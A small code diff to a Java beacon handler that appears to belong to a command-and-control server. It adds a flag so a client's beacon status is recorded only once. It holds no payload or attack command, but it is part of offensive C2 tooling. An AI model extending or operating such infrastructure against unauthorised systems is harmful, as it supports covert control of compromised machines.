@@ -112,6 +112,7 @@ public class C2ServerBeaconHandler implements Runnable{
                         C2server.updateClientLastSeen(ip);
                         if (!hasToldStatus){
                             C2server.setBeaconHTTP(this.IP);
+                            hasToldStatus = true;
                         }
                         C2server.updateBeaconClientHttpsMap(ip, this.IP);
                     }
